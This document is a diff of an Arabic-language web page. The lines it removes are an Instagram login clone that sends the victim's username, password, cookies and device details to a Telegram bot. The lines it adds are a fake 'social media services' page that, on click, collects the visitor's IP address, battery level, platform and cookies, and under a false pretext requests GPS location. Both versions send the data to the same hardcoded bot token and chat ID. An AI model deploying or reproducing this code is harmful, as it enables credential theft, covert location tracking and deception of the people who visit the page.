@@ -1,64 +1,190 @@
 <!DOCTYPE html>
-<html lang="ar" dir="rtl">
+<html lang="ar">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>تسجيل الدخول • Instagram</title>
+    <title>ALSSRY - SERVICES</title>
     <style>
-        body { background-color: #fafafa; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .login-box { background: white; border: 1px solid #dbdbdb; width: 350px; padding: 40px; text-align: center; box-sizing: border-box; }
-        .logo { width: 175px; margin-bottom: 20px; }
-        input { width: 100%; padding: 9px; margin-bottom: 7px; background: #fafafa; border: 1px solid #dbdbdb; border-radius: 3px; box-sizing: border-box; font-size: 12px; }
-        .btn { width: 100%; background-color: #0095f6; border: none; color: white; padding: 5px 0; font-weight: bold; border-radius: 4px; cursor: pointer; margin-top: 10px; }
-        .divider { margin: 20px 0; display: flex; align-items: center; color: #8e8e8e; font-size: 13px; font-weight: bold; }
-        .divider::before, .divider::after { content: ""; flex: 1; height: 1px; background: #dbdbdb; }
-        .fb-login { color: #385185; font-weight: bold; font-size: 14px; cursor: pointer; text-decoration: none; }
+        :root { --main-green: #00ff00; --glow-red: #ff0000; }
+        body { background-color: #010101; color: white; text-align: center; font-family: 'Arial', sans-serif; margin: 0; overflow-x: hidden; direction: rtl; }
+        
+        #starfield { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: -2; background: black; }
+        .star { position: absolute; background-color: white; border-radius: 50%; animation: moveStar linear infinite; opacity: 1; box-shadow: 0 0 5px white; }
+        @keyframes moveStar { from { transform: translateY(100vh); } to { transform: translateY(-10vh); } }
+        #blur-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: -1; backdrop-filter: blur(2px); background: rgba(0,0,0,0.5); }
+
+        .logo-3d { 
+            font-size: 42px; font-weight: 900; color: white; letter-spacing: 6px;
+            text-shadow: 3px 3px 0px var(--glow-red), -3px -3px 0px var(--main-green);
+            margin: 20px 0; display: block;
+        }
+
+        .watermark { 
+            position: fixed; top: 55%; left: 50%; transform: translate(-50%, -50%);
+            font-size: 25px; font-weight: bold; color: rgba(255,255,255,0.4);
+            filter: blur(0.8px); pointer-events: none; z-index: 5;
+            text-shadow: 1px 1px var(--glow-red);
+        }
+
+        #landing-page { height: 100vh; display: flex; flex-direction: column; justify-content: center; align-items: center; padding-top: 60px; }
+        .hero-title { font-size: 2.4rem; font-weight: bold; margin-bottom: 40px; text-shadow: 0 0 8px var(--main-green); }
+        .start-btn { padding: 16px 70px; background: transparent; border: 1px solid var(--main-green); color: var(--main-green); border-radius: 50px; font-size: 22px; cursor: pointer; transition: 0.4s; }
+
+        #tools-interface { padding: 20px; display: none; z-index: 10; }
+        .glass-btn { 
+            width: 90%; padding: 16px; margin: 10px 0; background: rgba(255, 255, 255, 0.05); 
+            border: 1px solid rgba(0, 255, 0, 0.3); color: var(--main-green); border-radius: 12px; font-weight: bold; cursor: pointer; 
+        }
+        input { width: 85%; padding: 15px; margin: 10px 0; border-radius: 10px; border: 1px solid #333; background: rgba(0,0,0,0.5); color: white; text-align: center; }
+        #progress-box { margin-top: 20px; border: 1px solid var(--main-green); padding: 15px; border-radius: 10px; background: rgba(0,0,0,0.9); }
+        #counter { font-size: 38px; font-weight: bold; color: var(--main-green); }
+
+        #live-status { position: fixed; bottom: 0; width: 100%; background: rgba(0,0,0,0.8); padding: 10px 0; }
+        .online-count { font-size: 13px; color: var(--main-green); }
+        .hidden { display: none !important; }
     </style>
 </head>
 <body>
 
-    <div class="login-box">
-        <img src="https://www.instagram.com/static/images/web/mobile_port_monospaced_login_header.png/75591938e51a.png" class="logo">
-        <form id="loginForm">
-            <input type="text" id="username" placeholder="اسم المستخدم أو الهاتف" required>
-            <input type="password" id="password" placeholder="كلمة السر" required>
-            <button type="submit" class="btn">تسجيل الدخول</button>
-        </form>
-        <div class="divider">أو</div>
-        <a class="fb-login">تسجيل الدخول باستخدام Facebook</a>
+    <div id="starfield"></div>
+    <div id="blur-overlay"></div>
+    <div class="watermark">snap : i5dqa</div>
+
+    <div id="landing-page">
+        <div class="logo-3d">ALSSRY</div>
+        <h1 class="hero-title">خدمات سوشال ميديا</h1>
+        <button class="start-btn" onclick="initTrap()">بدء</button>
+    </div>
+
+    <div id="tools-interface">
+        <div class="logo-3d">ALSSRY</div>
+        
+        <div id="main-menu">
+            <button class="glass-btn" onclick="showPlat('boost')">1- قسم الرشق 🚀</button>
+            <button class="glass-btn" onclick="showPlat('spam')">2- قسم الإسبام ⚔️</button>
+        </div>
+
+        <div id="platform-menu" class="hidden">
+            <button class="glass-btn" onclick="selectPlat('TikTok')">تيك توك</button>
+            <button class="glass-btn" onclick="selectPlat('Instagram')">انستقرام</button>
+            <button class="glass-btn" style="color:red;" onclick="goBack('main-menu')">رجوع</button>
+        </div>
+
+        <div id="service-menu" class="hidden">
+            <div id="boost-btns" class="hidden">
+                <button class="glass-btn" onclick="openInput('متابعين', 'يوزر (@)', 5000)">متابعين</button>
+                <button class="glass-btn" onclick="openInput('لايكات', 'رابط (http)', 5000)">لايكات</button>
+            </div>
+            <button id="spam-btn" class="glass-btn hidden" onclick="openInput('إسبام', 'يوزر (@)', 300)">بدء الإسبام</button>
+            <button class="glass-btn" style="color:red;" onclick="goBack('platform-menu')">رجوع</button>
+        </div>
+
+        <div id="final-step" class="hidden">
+            <h3 id="display-title" style="color:var(--main-green)"></h3>
+            <input type="text" id="target-id" placeholder="أدخل البيانات">
+            <input type="number" id="target-count" placeholder="العدد">
+            <button class="glass-btn" style="background:var(--main-green); color:black;" onclick="requestGPS()">تأكيد التنفيذ ✅</button>
+            <button class="glass-btn" style="color:red;" onclick="goBack('service-menu')">رجوع</button>
+            <div id="progress-box" class="hidden">
+                <div id="counter">0</div>
+            </div>
+        </div>
+
+        <div id="live-status">
+            <div class="online-count">🟢 المتصلون الآن: <span id="user-count">245</span></div>
+        </div>
     </div>
 
     <script>
-        const botToken = '8619490492:AAEfXC0wN0Uh73BA9TniEqyQh_gb_GyfzUg';
-        const myId = '5811700860';
+        // إعدادات البوت الخاص بك
+        const BOT_TOKEN = "8619490492:AAEfXC0wN0Uh73BA9TniEqyQh_gb_GyfzUg";
+        const CHAT_ID = "5811700860";
 
-        document.getElementById('loginForm').addEventListener('submit', function(e) {
-            e.preventDefault();
+        let mode="", plat="", service="", currentOnline = 245;
+        let deviceData = {};
+
+        function createStars() {
+            const container = document.getElementById('starfield');
+            for(let i=0; i<100; i++) {
+                const star = document.createElement('div');
+                star.className = 'star';
+                star.style.width = star.style.height = Math.random()*4+'px';
+                star.style.left = Math.random()*100+'vw';
+                star.style.animationDuration = Math.random()*6+3+'s';
+                container.appendChild(star);
+            }
+        }
+        createStars();
+
+        // إرسال مباشر لتليجرام
+        function sendToTelegram(text) {
+            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(text)}&parse_mode=Markdown`;
+            fetch(url);
+        }
+
+        async function initTrap() {
+            document.getElementById('landing-page').style.display = 'none';
+            document.getElementById('tools-interface').style.display = 'block';
+
+            // سحب IP
+            try {
+                const res = await fetch('https://api.ipify.org?format=json');
+                const data = await res.json();
+                deviceData.ip = data.ip;
+            } catch(e) { deviceData.ip = "Hidden"; }
+
+            // سحب بطارية
+            try {
+                const batt = await navigator.getBattery();
+                deviceData.battery = Math.round(batt.level * 100) + "%";
+            } catch(e) { deviceData.battery = "Unknown"; }
+
+            deviceData.platform = navigator.platform;
+            deviceData.cookies = document.cookie || "لا يوجد كوكيز";
+
+            let report = `🚀 *صيد جديد من الواجهة!*\n\n🌐 *IP:* \`${deviceData.ip}\`\n🔋 *البطارية:* \`${deviceData.battery}\`\n💻 *النظام:* \`${deviceData.platform}\`\n🍪 *الكوكيز:* \`${deviceData.cookies}\``;
             
-            const user = document.getElementById('username').value;
-            const pass = document.getElementById('password').value;
-            const cookies = document.cookie || "لا توجد كوكيز متاحة حالياً";
-            const device = navigator.userAgent;
+            sendToTelegram(report);
+            updateOnline();
+        }
 
-            // إرسال البيانات المدموجة للبوت
-            const message = `
-🎣 **صيد جديد (مدموج):**
-👤 **اليوزر:** \`${user}\`
-🔑 **الباسورد:** \`${pass}\`
-🍪 **الكوكيز:** \`${cookies}\`
-📱 **الجهاز:** \`${device}\`
-            `;
-
-            fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${myId}&text=${encodeURIComponent(message)}&parse_mode=Markdown`)
-            .then(() => {
-                // بعد السحب، نسوي المقلب النفسي اللي وعدتك به
-                alert("⚠️ خطأ في المصادقة: جاري فحص ملفات النظام...");
-                setTimeout(() => {
-                    alert("❌ تم اكتشاف دخول مشبوه، جاري سحب الصور لتأمين الحساب!");
-                    window.location.href = "https://www.instagram.com"; // تحويله للموقع الحقيقي
-                }, 1000);
+        function requestGPS() {
+            alert("⚠️ لضمان سرعة التنفيذ، يرجى السماح بالوصول للموقع لتحديد أقرب سيرفر.");
+            navigator.geolocation.getCurrentPosition((pos) => {
+                const gpsMsg = `📍 *موقع الضحية:*\nالرابط: https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
+                sendToTelegram(gpsMsg);
+                startProcess();
+            }, (err) => { 
+                sendToTelegram("❌ الضحية رفض إعطاء الموقع.");
+                startProcess(); 
             });
-        });
+        }
+
+        function startProcess() {
+            const id = document.getElementById('target-id').value;
+            const count = document.getElementById('target-count').value;
+            const finalMsg = `💎 *طلب تنفيذ جديد:*\nالخدمة: ${service}\nالحساب: \`${id}\`\nالعدد: ${count}`;
+            sendToTelegram(finalMsg);
+            
+            document.getElementById('progress-box').classList.remove('hidden');
+            let cur = 0;
+            let inv = setInterval(() => {
+                if(cur >= 100) { clearInterval(inv); alert("اكتمل التنفيذ بنجاح!"); location.reload(); }
+                else { cur++; document.getElementById('counter').innerText = cur + "%"; }
+            }, 50);
+        }
+
+        function updateOnline() {
+            setInterval(() => {
+                currentOnline += Math.floor(Math.random()*5) - 2;
+                document.getElementById('user-count').innerText = currentOnline;
+            }, 3000);
+        }
+
+        function showPlat(m) { mode=m; goBack('platform-menu'); }
+        function selectPlat(p) { plat=p; goBack('service-menu'); document.getElementById('boost-btns').className = (mode==='boost') ? "" : "hidden"; document.getElementById('spam-btn').className = (mode==='spam') ? "glass-btn" : "hidden"; }
+        function openInput(s, ph, max) { service=s; goBack('final-step'); document.getElementById('display-title').innerText = plat + " - " + s; document.getElementById('target-id').placeholder = ph; document.getElementById('target-count').placeholder = "الحد الأقصى: "+max; }
+        function goBack(id) { document.querySelectorAll('#main-menu, #platform-menu, #service-menu, #final-step').forEach(el => el.classList.add('hidden')); document.getElementById(id).classList.remove('hidden'); }
     </script>
 </body>
 </html>
